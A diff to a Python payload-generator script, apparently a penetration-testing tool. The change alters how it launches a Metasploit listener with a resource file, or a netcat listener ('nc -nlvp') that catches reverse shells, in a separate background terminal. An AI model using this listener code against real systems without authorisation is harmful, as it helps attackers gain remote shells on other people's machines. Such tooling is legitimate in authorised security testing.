@@ -144,21 +144,17 @@ def generate_payload(params,number,avail_payloads,pname):
                 f.write(msf_cmd)
             
             print(Green("[*] Launching Metasploit ..."))
-            subprocess.call("qterminal -e msfconsole -r listener.rc", shell=True)
+            # Launch metasploit in another terminal
+            # works only in Kali OR OS with Qterminal
+            #subprocess.Popen("qterminal -e 'msfconsole -r listener.rc'", shell= True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            #subprocess.Popen("qterminal -e 'msfconsole'", shell= True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            subprocess.call("qterminal -e msfconsole -r listener.rc > /dev/null 2>&1 &", shell=True)
             
-        else: # netcat shell
+        else: # Open netcat shell in another TERM
             msf_cmd = "nc -nlvp {}".format(PORT)
-            #subprocess.call(["qterminal" , "-e", msf_cmd], shell=True)  # Problem of double quotes 
-            # error generated in metasploit : Parse error: Unmatched double quote: "'''use"
+            subprocess.call("qterminal -e '{}' > /dev/null 2>&1 &".format(msf_cmd), shell= True)
 
-        # Launch metasploit in another terminal
-        # works only in Kali and Os with Qterminal
-       
-        
-        #os.system(msf_cmd)
-
-        
-    
+            #os.system(msf_cmd)
     return 
 
 
